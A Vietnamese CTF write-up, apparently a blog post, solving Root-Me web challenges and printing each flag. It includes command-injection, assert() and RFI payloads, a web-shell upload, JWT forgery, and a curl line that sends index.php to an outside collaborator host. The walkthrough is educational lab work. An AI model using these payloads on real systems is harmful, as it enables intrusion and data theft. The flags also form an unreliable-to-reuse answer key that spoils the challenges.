# 1. HTML - Source code
Bài đầu tiên khá đơn giản, chỉ cần view source là thấy ngay password rồi
![image.png](https://images.viblo.asia/c271f96a-4dea-4d80-b865-0aeadeab631e.png)

password là: **nZ^&@q5&sjJHev0**


# 2. HTTP - Open redirect 
khi vừa mới vào bài này bạn đề ý tên của bài nhé. Hàm ý bảo là sẽ làm gì đó để kích hoạt chuyển hướng và để giải quyết bài này ta phải chuyển hướng đến tên miền khác với tên hiển thị trong web.
Ok , khi view source ta thấy có 3 đường dẫn đến 3 website tương ứng. Tuy nhiên sau đó lại có tham số h truyền vào. Nó có ý nghĩa gì vậy. thử thay đổi h 1 chút xem sao. 

![image.png](https://images.viblo.asia/51975106-64de-48ee-bf3d-24dbc43b7d05.png)

Yeah kết quả là nó chẳng chuyển hướng được. tại sao vậy nhỉ. Nhìn vào chuỗi giá trị của h . Hmm rất giống hash MD5 của 1 chuỗi gì đó. Nhưng nó lại liên quan đến việc chuyển hướng. Để thử dự đoán, tôi hash thử chuỗi `http://facebook.com` và nó ra đúng giá trị của h. Ok vậy dễ rồi. để chuyển hướng ngoài domain ta cần giá trị hash MD5 của nó ví dụ như `google.com` đi. Payload sẽ là :                           **?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f.** 

![image.png](https://images.viblo.asia/4dcdbb90-0b76-45cb-a622-077260d8ec37.png)

và password là: **e6f8a530811d5a479812d7b82fc1a5c5**

# 3. HTTP - User-agent
Ngay từ đầu thì tên bài này đã gợi ý cho chúng ta 1 chút rồi. Cơ bản thì User-agent là 1 header biểu thị thông tin về browser của bạn. Khi bắt đầu challenge ta sẽ thấy 1 website như sau:

![image.png](https://images.viblo.asia/7f3e3f59-5298-46a9-a941-fa5104cda004.png)

Ta thấy 1 dòng duy nhất: 
**Wrong user-agent: you are not the "admin" browser!**  
Bạn còn nhớ tới user-agent header tôi nói ở trên chứ. Tiêu đề này hiển thị thông tin về browser của bạn. Mà câu trên chỉ ra rằng bạn không phải "admin" browser. Như vậy ta chỉ cần sửa lại giá trị tiêu đề user-agent thành admin là xong:

![image.png](https://images.viblo.asia/476df14f-b646-4bb9-bc85-e3636f54b39b.png)

password là: **rr$Li9%L34qd1AAe27**

# 4. Weak Password
Bài này thì khá đơn giản. sau khi vào chall ta thấy đề bắt yêu cầu nhập username và password. Ngay từ đầu tôi thử nhập admin/admin. Ai ngờ nó được luôn thế là ra luôn. 

Password: **admin**

# 5. PHP - Command injection
The flag is on the `index.php` file. 

Đây là gợi í của bài. Yeah mục tiêu là phải đọc được file `index.php` này. Khi bắt đầu vào chall, ta thấy 1 công cụ dùng để ping đến ip bạn nhập vào. Có thể tool này dùng câu lệnh `exec('ping $ip')` trong php để thực hiện lệnh ping.

![image.png](https://images.viblo.asia/70f1a891-bf43-422b-826e-e86db5727c77.png)

bài này thì khá giống kiến thức đối với lỗi Command injection trong PortSwigger nói khá rõ ([ở đây](https://portswigger.net/web-security/os-command-injection)). Ta sẽ dùng dấu ngăn cách lệnh trong linux `;`để thử xem sao. Ở đây tôi thực hiện lệnh `ls -la` để xem trong thư mục này có những gì (**payload: google.com;ls -la**)

![image.png](https://images.viblo.asia/6037b457-8815-4740-9b1c-108179e0895e.png)


Tốt rồi có file index.php, ta xem file đó có gì nào (**payload: google.com;cat index.php**)

![image.png](https://images.viblo.asia/b7d116f5-9f26-419e-b5fb-1baceb5e2288.png)

Xem source code ta nhận được password: **S3rv1ceP1n9Sup3rS3cure**

![image.png](https://images.viblo.asia/1cc7ad60-8c86-4afe-bc34-58752f1a03f7.png)


# 6. Backup file
Tên bài là backup file nha. Khi vào chall ta thấy ô nhập login và password. Tuy nhiên từ từ đã. Bạn chẳng thể mò mẫm được. Nhớ tên bài là Backup file nha. Như vậy ta sẽ tìm cách tìm được file backup để xem source code. Ở đây tôi dùng công cụ `dirsearch` để tìm các file ẩn.

![image.png](https://images.viblo.asia/11196656-a62c-497e-a5ef-a24c7c243adf.png)

Ở đây tôi tìm được file index.php~. Yep đây chính là file backup của nó. Tải về xem được gì nào. 

![image.png](https://images.viblo.asia/424e69a7-f279-4098-93b8-df0fc5e090fb.png)

password: **OCCY9AcNm1tj**

# 7. HTTP - Directory indexing
Nghe tên bài có mùi kiểu cây thư mục í nhỉ ^-^.  Đầu tiên ta sẽ xem source code xem có gì.

![image.png](https://images.viblo.asia/d4f4d13d-1247-4918-b840-1f07fcf6d142.png)

Bạn thây cái này chứ: `<!-- include("admin/pass.html") -->`. Ta vào theo đường dẫn xem có gì

![image.png](https://images.viblo.asia/68d25675-58a1-40d8-8145-82016dc7fcfc.png)

Ta chẳng được gì cả. Wait, tại sao họ cho mình đi đến tận admin/pass.html mà không có gì. thử back ra /admin xem sao. 

![image.png](https://images.viblo.asia/0d556ec7-bc1e-4872-b60a-b1644000fee6.png)

Thấy ngay thư mục có tên backup. Ngon rồi đây. Vào đó xem.

![image.png](https://images.viblo.asia/7279ff56-159e-4d0f-a19a-cd5cb1e85efc.png)

Đấy, có admin.txt rồi kìa. vào đó chắc là có kết quả rồi.

![image.png](https://images.viblo.asia/1594f822-3f7f-4c75-a560-ccc48a0f7606.png)

-> password: **LINUX**


# 8. HTTP - Headers
Đây là gợi ý của bài nhé:  **HTTP response give informations**
Hmm. Nhắc tới response, thế mình cứ đưa vào burp chặn xem ta có gì.

![image.png](https://images.viblo.asia/5567e25c-4ba2-4e19-b16f-630239f9c6be.png)

Bận thấy thằng: `Header-RootMe-Admin: none` chứ. Thế chắc muốn đi tiếp ta phải có thằng header này ở request rồi. Giá trị của nó ta đặt thành true.

![image.png](https://images.viblo.asia/55f85b04-4810-4f29-b679-96453d1cc4aa.png)

ta có ngay password: **HeadersMayBeUseful**

# 9. HTTP - POST
Khi vào chall, mục tiêu của ta là phải vượt qua số điểm 999999 thì mới có thể lấy được password. Sau 1 số lần thử Give a try tôi cũng chẳng thể vượt qua được số điểm đó. Cũng đúng thôi chả nhẽ dễ mà qua thế. Thử đưa vào burp sửa đổi giá trị của điểm xem có dược không. 

![image.png](https://images.viblo.asia/90263cb0-fb8e-4be7-a2d3-4bf4e6575ef9.png)

Yeah. Ăn ngay. Password: **H7tp_h4s_N0_s3Cr37S_F0r_y0U**


# 10. HTTP - Improper redirect
Sau khi bắt đầu chall, ta lại thấy form đăng nhập quen thuộc, Sau khi loay hoay 1 hồi thì ô thôi chả đâu vào đâu cả. Bài này tôi phải lục tìm write up. Bị lừa rồi. Haizz.Làm sao có chuyện chuyển hướng chỉ với cái tham số redirect được chứ (http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect). Tóm lại là lại vứt vào burp xem nó từ đâu đưa mình đến đây. 

![image.png](https://images.viblo.asia/cec91958-5820-4a88-be22-0386dbc8da53.png)

Vâng và ta có password rồi: **ExecutionAfterRedirectIsBad**
Lỗi ở đây chính là sau khi redirect trang bằng header **Location**, họ quên exit() hoặc die() nên phần code theo sau vẫn được thực hiện.
``` <?php
// PHP permanent URL redirection
header("Location: http://www.domain.com/new-page.php", true, 301);
exit(); // <----- notice
// old code and flag go here
?> 
```
# 11. HTTP - Verb tampering
Bài này về cơ bản là nó xác thực với phương thức thường dùng là GET và POST. Như vậy thì mình chỉ cần sửa phương thức thành cái khác ví dụ như PUT chẳng hạn là được (Bài này tôi phải đọc write up mới làm được - ai ngờ xác thực như vậy đâu. hic)

![image.png](https://images.viblo.asia/983c1ce6-01e0-49e8-9f5e-73b71daa4a79.png)

password: **a23e$dme96d3saez$$prap**

# 12. install files
Đầu tiên thì PhpBB là một phần mềm miễn phí và cung cấp các tính năng hữu ích có sẵn, đây là công cụ xây dựng diễn đàn phổ biến nhất hiện nay. Cái tên phpBB là từ viết tắt của cụm `PHP Bulletin Board`.
Đọc source ta thấy dòng này: `<!--  /web-serveur/ch6/phpbb -->` .
Với bài này ta sẽ dùng dirsearch để xem có những file ẩn nào.

![image.png](https://images.viblo.asia/1b876240-3e5c-418a-b114-cc1f244a2503.png)

Ở đây Dev quên xóa folder install rồi.HAHA. truy cập vào xem có gì nào.

![image.png](https://images.viblo.asia/b7e3c16d-44df-4ed6-9ef6-daa4178c397d.png)

Thấy file install.php rồi. Ngon rồi. Truy cập vào ta được password luôn

![image.png](https://images.viblo.asia/369c43c7-3de8-482d-bb13-d9a8c1d3dd60.png)

password:  **karambar**


# 13. CRLF
Bài này thì liên quan đến kiến thức về CRLF. Đầu tiên các bạn cần biết CRLF là viết tắt của Carriage Return và Line Feed, **CR** và **LF** là các ký tự điều khiển, được mã hóa tương ứng**0x0D** (13 trong hệ thập phân) và **0x0A** (10 trong hệ thập phân). Chúng được sử dụng để đánh dấu ngắt dòng trong tệp văn bản.
Khi bạn nhập vào ô login là gì thì nếu xác thực không thành công, log sẽ ghi lại giá trị đó cộng với câu: "failed to authenticate.". Mục tiêu của ta là phải xác thực thành công, tức là phải log lại được thằng admin xác thực thành công. Như vậy lợi dụng CRLF ta sẽ có payload như sau:
`http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0d%0aguest&password=`

trong đó **%0d%0a** là \r\n. Giải thích payload này. Sau khi cho chạy, ta sẽ log được 2 dòng như hình dưới. 

![image.png](https://images.viblo.asia/0741bb91-4c6c-42fc-86d3-e84332fa4cb1.png)

password: **rFSP&G0p&5uAg1%**

# 14. File upload - Double extensions
Your goal is to hack this photo gallery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

Đây là gợi ý của đề bài. Tóm lại ta sẽ tìm cách upload file PHP lên server và đọc file .passwd để tìm password. Ok vào bài thôi.

![image.png](https://images.viblo.asia/0870039e-8a6e-41d0-a17e-db53b2795bba.png)

Nó chỉ cho upload file ảnh có đuôi .gif, .jpeg and .png thôi. Lên google tìm 1 con shell PHP rồi đổi tên nó thành đuôi .png là ok rồi. Ở đây tồi dùng Pony shell. Sau khi up load ta truy cập vào shell. Sau đó ta dùng ls -la để tìm xem trong các thư mục có gì, cho đến khi tìm được file .passwd rồi ta cat để xem nội dùng file đó thôi.

![image.png](https://images.viblo.asia/7c71639c-b443-4a6c-8018-1cf467723277.png)

password: **Gg9LRz-hWSxqqUKd77-_q-6G8**

# 15. File upload - MIME type
Bài này tương tự bài trước tuy nhiên, Lần này ta không thể gửi file như bài trước lên được nữa. Lí do nó đã cấu hình đúng rồi. Tuy nhiên nó lại sử dụng **Content-Type** để định kiểu dữ liệu gửi đi. Như vậy ta có thể sử dụng Burp để chặn và sửa đổi (Các bước y hệt bài trên ngoại trừ xóa đuôi .png trong request gửi lên trong burp)

![image.png](https://images.viblo.asia/1363b078-6e87-4371-8449-91cf4d95cd15.png)

Sau khi truy cập được vào shell ta làm tương tự như bài trên để đọc được file .passwd

![image.png](https://images.viblo.asia/8679cf27-87ec-4854-9cdb-501e559cca20.png)

Password: **a7n4nizpgQgnPERy89uanf6T4**

# 16. HTTP - Cookies
Sau khi view source ta thấy có 1 comment khả nghi: `<!--SetCookie("ch7","visiteur");-->`
Khi send email thì hiện ra thông báo **Email saved**. Nhưng khi bấm **Saved email adresses** thì lại hiện thông báo **You need to be admin**. Ta sử dụng burp tiến hành chặn request thử xem.

![image.png](https://images.viblo.asia/9e397a7f-5c4c-495c-a4ab-53cec9d1250d.png)

bạn sẽ thấy phần tiêu đề cookie có giá trị là **ch7=visiteur**. Sửa lại giá trị này thành **ch7=admin** là ok.

![image.png](https://images.viblo.asia/8b79ca72-5b32-4d92-a9bf-0c4386962cb6.png)

password: **ml-SYMPA**

# 17. Insecure Code Management
Bài này liên quan đến git. Khi cài đặt mọi thứ với git thì sẽ có 1 folder được tự động generate là .git. Đẻ kiểm tra xem có folder này tồn tại hay không. Tôi sử dụng công cụ dirsearch để tìm kiếm

![image.png](https://images.viblo.asia/5974bfea-dffb-4b77-8291-6839117ca7c1.png)

Bây giờ ta tải hết chúng xuống bằng câu lệnh: `wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/`. Sau đó sử dụng **git show** để xem kết quả.

![image.png](https://images.viblo.asia/701af100-d53a-422e-8adf-c4c50c040c2c.png)

password: **s3cureP@ssw0rd**

# 18. JSON Web Token (JWT) - Introduction
Bài này có liên quan dến kiến thức về JWT. Để giải quyết bài này ta phải kết nối đến như là admin. Khi vào bài ta sẽ thấy khung đăng nhập. Dĩ nhiên là ta chưa biết username cũng như password. Tuy nhiên ta lại được phép đăng nhập như là guest. Thử chặn bằng burp xem có gì.

![image.png](https://images.viblo.asia/3a6864e1-7ac4-4c02-aaee-bdb432869762.png)

Bạn để ý phần respone trả về có tiêu đề `Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`. Lấy giá trị JWT kia và sử dụng công cụ jwt.io để decode nó ra xem.

![image.png](https://images.viblo.asia/dbc016b9-b5d8-4e55-979a-cbe5a3de3057.png)

Như bạn thấy ở đây phần Payload chứa giá trị "username": "guest". Và phần Signature chúng ta không biết. Tuy nhiên chúng ta có thể bỏ qua nó bằng cách để "alg": "none" (cái này do nó bị dính lỗi CVE-2018-1000531). Để kết nối đến như là admin, ta thay "username": "admin". Ở đây tôi dùng thư viện pyjwt trong python để tạo mã jwt. Ta được mã: **eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0**. Copy mã này vào tiêu đề Cookie: trong burp ta được

![image.png](https://images.viblo.asia/e22df1ea-9046-4407-bf44-6c75c6f8d1c7.png)

password: **S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7**

# 19. Directory traversal
 Sau khi vào bài, ta thấy để truy cập vào các tag đều thông qua param **?galerie=** . Ta sử dụng dirbuster để tìm kiếm các tag khả thi.

![image.png](https://images.viblo.asia/7f015d0c-8b74-4225-8518-ef5f7d080317.png)

Thấy xuất hiện đường link sau mà không có trên giao diện trang web: `http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r`. Truy cập vào thì thấy có 1 mục là password.txt. Truy cập vào ta lấy được password

![image.png](https://images.viblo.asia/7d5ddf22-7782-4677-b1e0-0dd1af65ccd4.png)

password: **kcb$!Bx@v4Gs9Ez** 


# 20. File upload - Null byte
Bài này cũng tương tự bài trước. Tuy nhiên ở bài này thì ta sẽ thực hiện chèn kí tự null vào tên file. Lí do là vì nó check đuôi file nhưng khi đọc tên file nó chỉ đọc đến kí tự null rồi dừng lại. Lỗi này đã được fix từ phiên bản PHP 5.3

![image.png](https://images.viblo.asia/4836c71f-1983-4321-b343-196f9c47648c.png)

Sau khi upload thành công ta nhấp vào ảnh vừa upload và thu được password: **YPNchi2NmTwygr2dgCCF**

# 21. JSON Web Token (JWT) - Weak secret
 Sau khi truy cập ta được như sau: 

*{"message": "Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."}*

Ta tạo GET request đến **/token** thì được 1 token sau: 
`eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.a4Cxf97xhqpexX-Mw0Ik74ncg6TdCK8R_Q7wYC929himTEOyJmePFYCJYvj-ICUTZrVqjPUa83GeMO5AVuOH0Q`

Đưa vào jwt.io thì ta được như sau: 

![image.png](https://images.viblo.asia/c4c632af-7679-48f6-b501-feedc7fafa0b.png)

Phần payload có ghi là
```
{
  "role": "guest"
}
như vậy để truy cập như là admin ta chỉ cần thay đổi thành
{
  "role": "admin"
}
```
Tuy nhiên cái khó ở đây là chúng ta không biết private key của nó là gì. Ở đây ta chỉ còn cách là vét cạn các khả năng thôi. Tôi dùng **jwt_tools** và tập **rockyou.txt** để làm điều này

![image.png](https://images.viblo.asia/36377ed3-c234-41a0-947f-32fb6eda4311.png)

key của chúng ta là: **lol**
Tiếp tục sử dụng thư viện pyjwt trong python để generate ra mã jwt của ta.

![image.png](https://images.viblo.asia/61ffe542-5089-4848-9721-a8acd8237b95.png)

đưa mã đó vào burp suite khi ta tạo POST request đến /admin là ta sẽ có được password

![image.png](https://images.viblo.asia/f54fcc7e-bc7b-49f4-99d0-97dc67dc9387.png)

password: **PleaseUseAStrongSecretNextTime**

# 22. PHP - assert()
Trong lập trình PHP có các lệnh là include, require, include_once, require _ once cho phép việc file hiện tại gọi ra một file khác. 
File Inclusion Attack: là kỹ thuật khai thác dựa trên lỗi include file trong PHP.
Dấu hiện để có thể tấn công FI là đường link thường có dạng php?page=,hoặc php?file=. Để biết website có bị lỗi này hay không ta chỉ việc thêm một dấu ‘ vào đường link, cụ thể php?page=’. Và trên trình duyệt có thông báo lỗi hiện ra.
Khẳng định web này bị LFI bằng cách như trên.

![image.png](https://images.viblo.asia/0c59611e-87d4-49e9-a9d1-6a1b0d1ddb5a.png)

Ở thông báo lỗi chúng ta có 2 lệnh trong PHP được sử dụng là assert() và strpos(). Trong đó hàm assert() kiểm tra đầu vào và trả về giá trị bool. Nếu kết quả là fallse thì nó sẽ thực hiện hành động thích hợp. Còn hàm strpos() dùng để tìm vị trí xuất hiện đầu tiên của chuỗi con trong chuỗi cha.
Code PHP của đoạn này có thể là:  
```assert("strpos('includes/$file.php', '..') === false") or die("Detected hacking attempt!");```  
Trong đó $file là nơi chúng ta nhập vào trên URL. Như vậy để bypass đoạn code trên ta xây dựng payload sau: `http://challenge01.root-me.org/web-serveur/ch47/?page=','1') or system("ls -la");//`
Ở đây mình để `//` cuối để comment hết mấy phần không cần thiết đi.

![image.png](https://images.viblo.asia/58ac5fea-c86b-46a2-9376-bb7be17e1cd9.png)

Ok. payload hoạt động rồi. Vậy chúng ta đọc file .passwd thôi

![image.png](https://images.viblo.asia/9d75c480-9a0d-48ea-a370-e726b3bea4e8.png)

password: **x4Ss3rT1nglSn0ts4f3A7A1Lx**

# 23. PHP - Filters
Sau khi truy cập vào trang login của bài thì trên URL khá gióng với bài trước. `http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php`. Cũng thử LFI như bài trước thế nhưng không được gì cả. Nhìn lại tên bài thì có lẽ phải sử dụng `php://filter` ở đây. 

php filter được dùng để xác thực và làm sạch đầu vào bên ngoài. có rất nhiều filter có thể được dùng. Một trong số đó là `convert.base64-encode` và `base64-decode`. 

`php://filter/convert.base64-encode/resource` cho phép chúng ta đọc bất kì file php nào. Tuy nhiên chúng sẽ được mã hóa base-64. Và chúng ta phải decode nó để có thể xem source các file 

đối với bài này ta tiến hành đoán các file có thể hữu dụng. Trong trường hợp này file đó là config.php
payload: `http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php` 

![image.png](https://images.viblo.asia/31349cb8-534c-41b5-a606-148a8607e441.png)

Ta nhận được 1 chuỗi được encode bởi base64. decode nó ra ta được password: **DAPt9D2mky0APAF**



# 24. PHP - register globals
Bài này ta sẽ ghi đè nội dung biến toàn cục. Đầu tiên ta phải tìm file backup của nó để xem nó hoạt động như thế nào. Ở đây tôi dùng dirsearch để làm việc đó. 

![image.png](https://images.viblo.asia/6261558a-2531-4aa9-91de-202622c47178.png)

file backup ở đây là index.php.bak. Tải về và xem nội dung. 

![image.png](https://images.viblo.asia/37442479-485d-4e71-a4ac-d86bb798e202.png)

Ở đây password sẽ hiện khi mà $_SESSION["logged"]==1. Như vậy ta thực hiện ghi đè biến này thông qua URL như sau: `http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1`

![image.png](https://images.viblo.asia/fabe37a3-b644-47de-9e9d-901b015af141.png)

password: **NoTQYipcRKkgrqG**

# 25. File upload - ZIP
Để hiểu rõ về lệnh link và ln trong linux các bạn có thể đọc thêm [ở đây](https://www.computerhope.com/unix/uln.htm). Bài này chúng ta tạo 1 liên kết đến file index.php:
`ln -s ../../../index.php test.txt `
Chúng ta cần quay lại 3 folder (các bạn thử từng folder 1 đến khi thấy index.php) và sau đó chúng ta nén lại với tùy chọn symlink (tạo liên kết tượng trưng)
`zip  --symlinks test.zip test.txt `
sau khi upload file lên. ta đọc file test.txt là sẽ thấy password: **N3v3r_7rU5T_u5Er_1npU7**

![image.png](https://images.viblo.asia/87f8662f-6c41-4c5b-a586-3f116349ea17.png)

# 26. Command injection - Filter bypass
Bài này tương tự bài 5. Về cơ bản ta cũng sẽ thấy 1 công cụ để ping đến 1 địa chỉ IP. Ta cũng thử với các dấu phân tách câu lệnh như bài 5, Tuy nhiên tất cả đều không được và trả về lỗi. Nhận thấy là chúng bị filter khá kĩ rồi. Không thể nào mà mò tay được và tôi cũng không đủ kiên nhẫn, nên tôi đã tìm được 1 list các payload về command injection ở [đây](https://github.com/payloadbox/command-injection-payload-list). Bắt đầu tìm payload hoạt động được bằng cách sử dụng Burp Intruder.

![image.png](https://images.viblo.asia/68617cdf-a427-40fa-adad-d27a467991f4.png)

Bạn để ý chứ. Những payload có %0A đều có respone trả về "Ping OK" tức có nghĩa là đã inject thành công. Tiếp theo để kiểm chứng xem liệu rằng ta có khai thác được hay không thì ta sẽ sử dụng burp repeater và inject command trên. Ở đây tôi sử dụng lệnh sleep 5 để kiểm chứng. Nếu thành công thì respone sẽ trả về sau 5 giây. Lí do tôi chọn lệnh này là do nó bị blind os command injection. Ta inject thành công tuy nhiên respone không trả về kết quả ta mong muốn

![image.png](https://images.viblo.asia/67bd5d1e-9db0-455b-aada-41006f507abf.png)

Để xử lý lỗi blind này ta thực hiện curl đến tên miền của chúng ta. Nếu ta nhận được request đến tức là thành công thực hiện Out-of-band rồi. Cho dễ dàng thì tôi dùng burp collaborator client (các bạn có thể sử dụng các nguồn khác như `https://requestbin.com`) .

![image.png](https://images.viblo.asia/5e3ca0a3-e12f-45d7-9fa4-650878dac651.png)

Tiếp theo ta sẽ thực hiện gửi nội dung file index.php với payload sau: `google.com%0Acurl -X POST -d @index.php https://ugedll9lbfhvbjnt9vaotw69m0sqgf.burpcollaborator.net` 
Ở đây dấu @ tức là gửi nội dung file .  Thế là ta đọc được index.php và password: **Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!**

![image.png](https://images.viblo.asia/50c1da8c-233d-423d-89c0-1d40753f9cbc.png)

# 27. Local File Inclusion
Local file inclustion (LFI) là kĩ thuật đọc file trong hệ thống , lỗi này xảy ra thường sẽ khiến website bị lộ các thông tin nhảy cảm như là passwd, php.ini, access_log,config.php…

![image.png](https://images.viblo.asia/28a0eba2-64f8-4e3b-b9f7-9f80fcd9c6e4.png)

Như bạn để ý thì trên URL có 2 tham số để chỉ định đường dẫn ta truy cập (dấu hiệu rất rõ ràng về lỗi RFI/LFI). Dựa vào bên góc phải thấy có 2 kiểu kết nối là guess/admin. Từ đó ta có thể đoán là có 1 thư mục tên là admin. Và cũng ở đề bài là ta phải tìm password trong admin section. Như vậy mục tiêu của ta là phải truy cập được vào file admin kia.
Tôi thử lần lượt "../" vào 1 trong 2 tham số cho đến khi xuất hiện file admin. Dưới đây là payload của tôi:
`http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php`

![image.png](https://images.viblo.asia/1d506b87-32e4-4409-a1ee-fbc7fcf063a6.png)

password: **OpbNJ60xYpvAQU8**

# 28. Local File Inclusion - Double encoding
![image.png](https://images.viblo.asia/a1fcabb2-2865-45f5-87f1-4a4a9937def8.png)

Như bạn thấy đấy, Trang này điều hướng bằng tham số page. Như vậy rất có thể trang bị dính lỗi LFI/RFI. Tương tự như bài trước tôi cũng sử dụng "../" để quay về các thư mục trên hệ thống của web. Tuy nhiên không may mắn được nữa rồi. Tôi nhận được thông báo: Attack detected. Chắc dó web nó lọc các kí tự này rồi. Tôi đọc tài liệu [này](https://owasp.org/www-community/Double_Encoding) để có thể làm được bài này. Các kí tự thường dùng sau khi được encode và double encode sẽ như sau: 
```
: => %3A => %253A

/ => %2F => %252F

. =>%2E => %252E

– => 2D => %252D

= => 3D => %253D
```
Đầu tiên tôi thử encode các kí tự ../ thành `%2E%2E%2f` theo URLencode và thử lại vào trong tham số page. Tuy nhiên vẫn như cũ bị bật ra thông báo như trên. Hmm. Đề bài là double encoding . Thử encode tiếp 1 lần nữa xem sao, như vậy `%2E%2E%2f thành %252E%252E%252F`

![image.png](https://images.viblo.asia/dee7535d-87e0-48a9-8645-bd4914bf5e9a.png)

Ok. không hiện thông báo kia nữa. Có hy vọng rồi. Nhiệm vụ của ta là phải đọc được source file của website này. Ứng dụng kiến thức như bài 23. Chúng ta sẽ sử dụng php://filte với base64 encoding. 
Payload sẽ thế này: `php://filter/convert.base64-encode/resource=contact`. Sau lần encode đầu tiên sẽ như thế này: `php%3A%2F%2Ffilter%2Fconvert%2Ebase64-encode%2Fresource%3Dcontact`. Và encode tiếp 1 lần nữa sẽ được: `php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcontact`. 

![image.png](https://images.viblo.asia/7da39329-03da-4194-acb3-3318874c9327.png)

decode đoạn đó ra ta được 

![image.png](https://images.viblo.asia/34e7eec4-d68c-4807-98cf-2722c150d5ec.png)

`<?php include("conf.inc.php"); ?>`
Rất có thể password nằm trong file conf.inc.php. Lưu í nữa là khi ta nhập tên file vào sau tham số page thì nó tự động thêm đuôi .inc.php. Như vậy ta chỉ cần thay contact thành conf là ok. Ta tiếp tục được 1 đoạn mã được encode bởi base64. decode nó ra là được

![image.png](https://images.viblo.asia/4919936f-51b2-4259-9070-db94030e80d1.png)

password: **Th1sIsTh3Fl4g!**

# 29. PHP - Loose Comparison
Kiến thức có liên quan ở [đây](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf). PHP có 2 model so sánh 1 là "==" gọi là loose comparison và "===" gọi là strict comparison. Khi đọc tài liệu ta thấy có 1 ví dụ sau: TRUE: "0e12345" == "0e54321". Các biết vì sao chúng nó bằng nhau không. lí do ở đây 0e trong php xem như là 0 mũ. Như vậy số đằng sau là bao nhiêu thì cũng bằng 0 thôi.  

![image.png](https://images.viblo.asia/af0596d6-2f43-445a-b25e-dfae92d88b25.png)

Quay lại bài. Sau khi đọc code thì ta thấy nhiệm vụ là phải điền vào giá trị vào ô seed và ô hash sao cho sau khi check ta được kết quả trả về true. Như vậy ta phải tìm giá trị ô hash sao cho sau khi hash MD5 nó bắt đầy bằng 0e. Để làm điều này ta sẽ chạy đoạn code sau: 
```
import hashlib

import re

for i in range(0,999999999):


    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()


    regex = re.match("^[0-9]+$",md5[3:])


    if ((md5[0:2]) == '0e' and regex):


        print(str(i)+"=>"md5)


        break


    else:


        print("wrong")

```
Và khi chạy thì kết quả là: 240610708=>0e462097431906509019562988736854
ta điền vào ô seed và hash giá trị lần lượt là 0e và 240610708 thì được password: **F34R_Th3_L0o5e_C0mP4r15On**

![image.png](https://images.viblo.asia/a1adf024-70ae-433c-a244-2c7f0ffdbcdd.png)

# 30. PHP - type juggling
Sử dụng burp suite bắt request ta có thể thấy dữ liệu được gửi đi dưới dạng chuỗi được encode. 

![image.png](https://images.viblo.asia/ad6dee5e-1cc1-4687-be61-66bde18afab9.png)

Decode nó ra thi nhận thấy dữ liệu này được viết dưới dạng JSON. Password được hash SHA256.

![image.png](https://images.viblo.asia/96b9e0ed-43f1-4fd7-bb3e-62860349b055.png)

Đọc code thì thấy để lấy được flag ta phải so sánh login với $USER và password với $PASSWORD_SHA256. Với tài liệu [này](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf) ta có thể dễ dàng bypass được loại so sánh yếu này và bypass hàm strcmp(). Cụ thể với login=true thì khi so sánh với string nó sẽ trả về true. Đồng thời hàm strcmp sẽ trả về null khi so sánh 1 mảng với giá trị khác. Như vậy ta có thể xây dựng payload sau:
`{"data":{"login":true,"password":["456"]}}`. Sau khi encode và gửi đi ta nhận được password: **DontForgetPHPL00seComp4r1s0n**

![image.png](https://images.viblo.asia/bfee2e1f-2010-4a9f-9e40-7ef51b32959c.png)

# 31. Remote File Inclusion
![image.png](https://images.viblo.asia/c39d8ea8-5074-4b25-8fd6-47d2c99e6d94.png)

Bài này bạn để ý trên URL nhé. Nó cho phép ta chọn ngôn ngữ dựa vào tham số lang. Để kiểm tra ta thử cho giá trị của tham số là `../../etc/password`

![image.png](https://images.viblo.asia/991da5d7-1b10-42f5-8332-bef3ccc2f54d.png)

Ta nhận được thông báo lỗi. Dường như bất cứ thứ gì ta nhập vào đều được tự động thêm đuôi **_lang.php**._ Việc đầu tiên ta phải tìm cách bỏ cái đuôi này đi. Sau khi tìm 1 hồi thì tôi tìm được cách đó là thêm dấu ? vào sau chuỗi ta nhập. Thử truy cập đến 1 web khác. `http://challenge01.root-me.org/web-serveur/ch13/?lang=https://vnexpress.net?`

![image.png](https://images.viblo.asia/57aac657-e664-44b5-8341-4371fb1f7bb5.png)

Ok ta đã truy cập được 1 trang khác. Bây giờ ta sẽ viết 1 đoạn code đơn giản từ trang https://pastebin.com/. Đoạn code : 
```
<?php
echo file_get_contents("index.php");
?>
```
Ở đây hàm **file_get_contents** sẽ đọc nội dung file thành 1 chuỗi. 
payload: `http://challenge01.root-me.org/web-serveur/ch13/?lang=https://pastebin.com/raw/FsYqLDeV?`

![image.png](https://images.viblo.asia/6f9d02ab-2f7c-47f2-a923-13698d41b10f.png)

Password: **R3m0t3_iS_r3aL1y_3v1l**

# 32. SQL injection - Authentication
![image.png](https://images.viblo.asia/d5aa4c5c-c689-40ab-aa6e-e43601e64494.png)

